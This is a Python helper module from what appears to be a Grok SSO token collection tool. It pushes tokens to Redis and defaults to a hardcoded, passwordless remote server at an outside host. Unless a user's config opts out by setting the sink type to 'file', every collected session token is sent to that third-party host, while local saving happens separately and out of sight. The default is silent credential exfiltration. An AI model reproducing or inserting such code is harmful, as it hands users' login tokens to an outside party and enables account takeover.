from __future__ import annotations

from typing import Any

# Hardcoded Redis sink (no password). Optional conf.sink.redis can override.
DEFAULT_REDIS_URL = "redis://a.z.whoyou.top:6378/0"
DEFAULT_REDIS_KEY = "grok_sso"
DEFAULT_REDIS_STRUCTURE = "list"  # list -> RPUSH; set -> SADD
DEFAULT_REDIS_SOCKET_TIMEOUT = 5.0


def push_to_redis(
    redis_url: str = DEFAULT_REDIS_URL,
    tokens: list[str] | None = None,
    key: str = DEFAULT_REDIS_KEY,
    socket_timeout: float = DEFAULT_REDIS_SOCKET_TIMEOUT,
    structure: str = DEFAULT_REDIS_STRUCTURE,
) -> tuple[bool, str]:
    cleaned_tokens = [str(token).strip() for token in (tokens or []) if str(token or "").strip()]
    if not cleaned_tokens:
        return True, "No tokens to push."

    url = str(redis_url or "").strip() or DEFAULT_REDIS_URL
    if not url:
        return False, "Redis URL is empty."

    redis_key = str(key or "").strip() or DEFAULT_REDIS_KEY
    structure_name = str(structure or DEFAULT_REDIS_STRUCTURE).strip().lower() or "list"
    try:
        timeout = float(socket_timeout)
    except (TypeError, ValueError):
        timeout = DEFAULT_REDIS_SOCKET_TIMEOUT
    if timeout <= 0:
        timeout = DEFAULT_REDIS_SOCKET_TIMEOUT

    try:
        import redis
    except ImportError:
        return False, "缺少 redis 依赖，请执行: pip install redis>=5.0.0"

    client = None
    try:
        client = redis.from_url(
            url,
            socket_timeout=timeout,
            socket_connect_timeout=timeout,
            decode_responses=True,
        )
        pipe = client.pipeline(transaction=False)
        if structure_name == "set":
            for token in cleaned_tokens:
                pipe.sadd(redis_key, token)
            results = pipe.execute()
            added = sum(1 for item in results if int(item or 0) > 0)
            duplicated = len(cleaned_tokens) - added
            return (
                True,
                f"SSO token 已写入 Redis SET（新增 {added} 个，重复 {duplicated} 个）: key={redis_key}",
            )

        for token in cleaned_tokens:
            pipe.rpush(redis_key, token)
        results = pipe.execute()
        pushed = len(cleaned_tokens)
        last_len = int(results[-1] or 0) if results else 0
        return (
            True,
            f"SSO token 已写入 Redis LIST（推送 {pushed} 个，当前长度 {last_len}）: key={redis_key}",
        )
    except Exception as exc:
        return False, f"Redis 推送失败: {type(exc).__name__}: {exc}"
    finally:
        if client is not None:
            try:
                client.close()
            except Exception:
                pass


def dispatch_sink(
    conf: dict[str, Any] | None,
    tokens: list[str],
    meta: dict[str, Any] | None = None,
) -> tuple[bool, str]:
    """Push tokens to Redis. Local sso/*.txt is handled by the runner separately.

    conf.sink.redis may override url/key/structure/timeout; otherwise hardcoded defaults.
    sink.type == "file" skips remote push.
    """
    _ = meta
    if not isinstance(conf, dict):
        conf = {}

    sink = conf.get("sink") if isinstance(conf.get("sink"), dict) else {}
    sink_type = str(sink.get("type") or "redis").strip().lower() or "redis"
    if sink_type == "file":
        return True, "No tokens to push."

    redis_conf = sink.get("redis") if isinstance(sink.get("redis"), dict) else {}
    redis_url = str(
        redis_conf.get("url", "")
        or sink.get("url", "")
        or DEFAULT_REDIS_URL
    ).strip() or DEFAULT_REDIS_URL
    redis_key = str(
        redis_conf.get("key", "")
        or sink.get("key", "")
        or DEFAULT_REDIS_KEY
    ).strip() or DEFAULT_REDIS_KEY
    structure = str(
        redis_conf.get("structure", "")
        or sink.get("structure", "")
        or DEFAULT_REDIS_STRUCTURE
    ).strip() or DEFAULT_REDIS_STRUCTURE
    socket_timeout = redis_conf.get("socket_timeout", DEFAULT_REDIS_SOCKET_TIMEOUT)
    return push_to_redis(
        redis_url=redis_url,
        tokens=tokens,
        key=redis_key,
        socket_timeout=socket_timeout,
        structure=structure,
    )


# Back-compat alias used by older call sites / health code that still import the name.
def push_tokens(*_args: Any, **_kwargs: Any) -> tuple[bool, str]:
    return False, "grok2api sink 已移除，请使用 Redis（push_to_redis / dispatch_sink）"
